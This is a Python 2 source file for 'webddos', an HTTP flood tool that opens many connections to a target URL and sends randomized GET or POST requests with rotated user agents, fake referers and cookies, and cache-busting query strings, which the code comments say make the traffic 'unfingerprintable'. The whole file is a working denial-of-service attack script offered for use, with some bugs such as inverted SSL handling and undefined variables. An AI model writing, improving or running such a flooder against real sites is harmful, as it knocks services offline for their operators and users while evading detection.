#!/usr/bin/env python
# -*- coding: utf-8 -*-

import re
import sys
import time
import random
import signal
import argparse
import threading
import httplib,urlparse,ssl


visit_times = 1
mutex = threading.Lock()

red = '\033[1;31m'
green = '\033[92m'
yellow = '\033[93m'
white = '\033[97m'
reset = '\033[0m'

__program__ = 'webddos'
__version__ = '1.0.0'
__license__ = 'GNU GPLv3'
__author__ = 'ssooking'
__myblog__ = 'www.cnblogs.com/ssooking'
__github__ = 'https://github.com/ssooking'
__copyright__ = '''
 _                                  _    _
| |__  _   _    ___ ___  ___   ___ | | _(_)_ __   __ _
| '_ \| | | |  / __/ __|/ _ \ / _ \| |/ / | '_ \ / _` |
| |_) | |_| |  \__ \__ \ (_) | (_) |   <| | | | | (_| |
|_.__/ \__, |  |___/___/\___/ \___/|_|\_\_|_| |_|\__, |
       |___/                                     |___/
'''

USER_AGENTS = (
    "Opera/8.52 (Windows NT 5.1; U; en)",
    "Opera/9.51 (Windows NT 6.0; U; en)",
    "Opera/9.25 (Macintosh; Intel Mac OS X; U; en)",
    "Opera/9.80 (X11; U; Linux i686; en-US; rv:1.9.2.3) Presto/2.2.15 Version/10.10", 
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_0; en-US) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.678.0 Safari/534.21",
    "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:0.9.2) Gecko/20020508 Netscape6/6.1",
    "Mozilla/5.0 (X11;U; Linux i686; en-GB; rv:1.9.1) Gecko/20090624 Ubuntu/9.04 (jaunty) Firefox/3.5",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6) AppleWebKit/531.4 (KHTML, like Gecko) Version/4.0.3 Safari/531.4",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_2; en-au) AppleWebKit/525.8+ (KHTML, like Gecko) Version/3.1 Safari/525.6",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_2; en-gb) AppleWebKit/525.13 (KHTML, like Gecko) Version/3.1 Safari/525.13"
)

visit_times = 1
mutex = threading.Lock()

def print_info():
    print('\n\tprogram: ' + __program__)
    print('\tversion: ' + __version__)
    print('\tlicense: ' + __license__)
    print('\tauthor: ' + __author__)
    print('\tmyblog: ' + __myblog__)
    print('\tgithub: ' + __github__)
    print(__copyright__)


def set_coding():
    if sys.version_info.major == 2:
        if sys.getdefaultencoding() is not 'utf-8':
            reload(sys)
            sys.setdefaultencoding('utf-8')


def print_highlight(message):
    times = get_time()
    msg_level = {'INFO': green, 'HINT': white, 'WARN': yellow, 'ERROR': red}
    for level, color in msg_level.items():
        if level in message:
            print(color + times + message + reset)
            return
    #print(white + times + message + reset)
    return


def exit_webddos(signum, frame):
    print_highlight('[HINT] you pressed the Ctrl + C key and you will exit webddos')
    print_highlight('[INFO] the webddos end execution')
    exit(signum)


def get_time():
    return '[' + time.strftime("%H:%M:%S", time.localtime()) + '] '



def set_max_req(options):
    if options.max_request is None:
        print_highlight('[WARN] you did not specify the maximum request parameter')
        server_dict = {'apache': {'post': 100, 'get': 100},
                       'nginx': {'post': 100, 'get': 756},
                       'iis': {'post': 400, 'get': 450}}
        for server in server_dict:
            if server in options.server:
                print_highlight('[INFO] setting the number of request parameters '
                                + str(server_dict[server][options.req_type]))
                options.max_request = server_dict[server][options.req_type]
                break
    
    if options.max_request is None:
        if options.req_type == 'post':
            if options.verbose:
                print_highlight('[INFO] the web server ' + options.server + ' ' + options.req_type + ' default setting 10000')
            options.max_request = 1000
        if options.req_type == 'get':
            if options.verbose:
                print_highlight('[INFO] the web server ' + options.server + ' ' + options.req_type + ' default setting 100')
            options.max_request = 1000


class WebDDOS(threading.Thread):
    url = None
    host = None
    port = 80
    socks = []
    ssl = False
    referers = []

    def __init__(self,options):
        threading.Thread.__init__(self)
        self.req_type = options.req_type
        self.options = options
        self.max_request = options.max_request
        self.target = options.target
        self.ParseURL()

        self.referers = [
            'http://www.bing.com/',
            'http://www.baidu.com/',
            'http://www.yandex.com/',
            'http://' + self.host + '/'
        ]

    def ParseURL(self):
    
        parsedUrl = urlparse.urlparse(self.target)
    
        if parsedUrl.scheme == 'https':
            self.ssl = True
        self.host = parsedUrl.netloc.split(':')[0]
        self.url = parsedUrl.path
        self.port = parsedUrl.port
    
        if not self.port:
            port = 80 if not ssl else 443
    
    
    def Attack(self):
        global visit_times, mutex
        try:
            for i in range(self.max_request):
                if self.ssl:
                    if self.ssl == True:
                        c = httplib.HTTPSConnection(self.host, self.port)
                    else:
                        				#solve problem of untrusted certificate
                        c = httplib.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context())
                else:
                    c = httplib.HTTPConnection(self.host, self.port)
                self.socks.append(c)
            
            for conn_req in self.socks:
                (url, headers) = self.createPayload()
                method = self.req_type
                conn_req.request(method.upper(), url, None, headers)
                if mutex.acquire():
                    visit_times += 1
                    mutex.release()
                    print_highlight('[HINT] attacking ' + self.target + ' ' + str(visit_times) + ' times')
                if self.options.wait != 0:
                    time.sleep(self.options.wait)
                    if options.verbose:
                        print_highlight('[INFO] sleeping ' + str(self.options.wait) + ' seconds to request')
            
            for conn_resp in self.socks:
                resp = conn_resp.getresponse()
    
            self.closeConnections()

        except:
            pass  # silently ignore

    def getUserAgent(self):
        return random.choice(USER_AGENTS)

    # builds random ascii string
    def buildblock(self, size):
        out_str = ''
    
        _LOWERCASE = range(97, 122)
        _UPPERCASE = range(65, 90)
        _NUMERIC = range(48, 57)
    
        validChars = _LOWERCASE + _UPPERCASE + _NUMERIC
    
        for i in range(0, size):
            a = random.choice(validChars)
            out_str += chr(a)
        return out_str

    def generateRequestUrl(self, param_joiner='?'):
        return self.url + param_joiner + self.generateQueryString(random.randint(1, 5))

    def generateQueryString(self, ammount=1):
        queryString = []
        for i in range(ammount):
            key = self.buildblock(random.randint(3, 10))
            value = self.buildblock(random.randint(3, 20))
            element = "{0}={1}".format(key, value)
            queryString.append(element)
    
        return '&'.join(queryString)

    def closeConnections(self):
        for conn in self.socks:
            try:
                conn.close()
            except:
                pass  # silently ignore

    def createPayload(self):
    
        req_url, headers = self.generateData()
        random_keys = headers.keys()
        random.shuffle(random_keys)
        random_headers = {}
    
        for header_name in random_keys:
            random_headers[header_name] = headers[header_name]
        return (req_url, random_headers)


    def generateData(self):
        returnCode = 0
        param_joiner = "?"
    
        if len(self.url) == 0:
            self.url = '/'
    
        if self.url.count("?") > 0:
            param_joiner = "&"
        request_url = self.generateRequestUrl(param_joiner)
        http_headers = self.generateRandomHeaders()
        return (request_url, http_headers)

    def generateRandomHeaders(self):
    
        # Random no-cache entries
        noCacheDirectives = ['no-cache', 'max-age=0']
        random.shuffle(noCacheDirectives)
        nrNoCache = random.randint(1, (len(noCacheDirectives) - 1))
        noCache = ', '.join(noCacheDirectives[:nrNoCache])
    
        # Random accept encoding
        acceptEncoding = ['\'\'', '*', 'identity', 'gzip', 'deflate']
        random.shuffle(acceptEncoding)
        nrEncodings = random.randint(1, len(acceptEncoding) / 2)
        roundEncodings = acceptEncoding[:nrEncodings]
    
        http_headers = {
            'User-Agent': self.getUserAgent(),
            'Cache-Control': noCache,
            'Accept-Encoding': ', '.join(roundEncodings),
            'Connection': 'keep-alive',
            'Keep-Alive': random.randint(1, 1000),
            'Host': self.host,
        }
    
        # Randomly-added headers
        # These headers are optional and are
        # randomly sent thus making the
        # header count random and unfingerprintable
        if random.randrange(2) == 0:
            # Random accept-charset
            acceptCharset = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
            random.shuffle(acceptCharset)
            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],
                                                                            round(random.random(), 1),
                                                                            round(random.random(), 1))
    
        if random.randrange(2) == 0:
            # Random Referer
            url_part = self.buildblock(random.randint(5, 10))
        
            random_referer = random.choice(self.referers) + url_part
        
            if random.randrange(2) == 0:
                random_referer = random_referer + '?' + self.generateQueryString(random.randint(1, 10))
        
            http_headers['Referer'] = random_referer
    
        if random.randrange(2) == 0:
            # Random Content-Trype
            http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])
    
        if random.randrange(2) == 0:
            # Random Cookie
            http_headers['Cookie'] = self.generateQueryString(random.randint(1, 5))
    
        return http_headers


def web_attack(options):
 
    set_max_req(options)

    try:
        worker = WebDDOS(options)
        worker.Attack()
    except(Exception):
        print_highlight('[WARN] Failed to start webddos! ')

def main():
    set_coding()
    
    if len(sys.argv) == 1:
        print('[*] Try to use -h or --help show help message')
        exit(1)
    
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog='''use examples:
        python webddos.py -u http://example.com/index.php -n 1000
        python webddos.py -u http://example.com/index.php -m get -n 1000 -v
        ''')
    
    parser.add_argument('-v', '--verbose', action='store_true', dest='verbose',
                        help='more verbose output,default disabled')
    
    parser.add_argument('-i', '--info', action='store_true', dest='info',
                        help='show developer information of webddos')
    
    parser.add_argument('-m', '--method', default='get', dest='req_type',
                        choices=['GET', 'get', 'POST', 'post'], metavar='',
                        help="specify request method,get or post (default GET)")
    
    parser.add_argument('-w', '--wait', type=float, default=0,
                        dest='wait', metavar='',
                        help='specify request interval seconds,0~3600 (default 0)')
    
    parser.add_argument('-t', '--timeout', type=int, default=5,
                        dest='timeout', metavar='',
                        help='timeout to parse web page (default 5)')
    
    parser.add_argument('-n', '--number', type=int,
                        dest='max_request', metavar='',
                        help='specify the max number of request parameters')
    
    parser.add_argument('-u', '--url', metavar='', dest='target',
                        help='target url to attack')
    
    parser.add_argument('-s', '--server', default='1000',
                        dest='server', metavar='',
                        choices=['apache', 'nginx', 'iis'],
                        help="specify web server name(apache,nginx,iis),default 1000")
    
    options = parser.parse_args()
    
    if options.info:
        print_info()
        exit(0)
    
    if options.target is None and options.url_file is None:
        print('[!] error: the argument -u is required')
        exit(1)
    
    options.req_type = options.req_type.upper()
    options.server = options.server.lower()
    
    print_highlight('[INFO] the webddos is starting...')
    
    signal.signal(signal.SIGINT, exit_webddos)
    if options.verbose:
        print_highlight('[INFO] Using verbose mode')
        if options.req_type == 'POST':
            print_highlight('[HINT] Using POST request mode')
        if options.req_type == 'GET':
            print_highlight('[HINT] Using GET request mode')
    
    if options.wait < 0 or options.wait > 3600:
        print_highlight('[ERROR] invalid request interval time ' + str(options.wait))
        print_highlight('[HINT] valid request interval seconds is 0 ~ 3600')
        print_highlight('\n[INFO] the webddos end execution')
        exit(1)
    print_highlight('[HINT] setting request interval seconds ' + str(options.wait))
    
    if options.target is not None:
        web_attack(options)

if __name__ == '__main__':
    main()

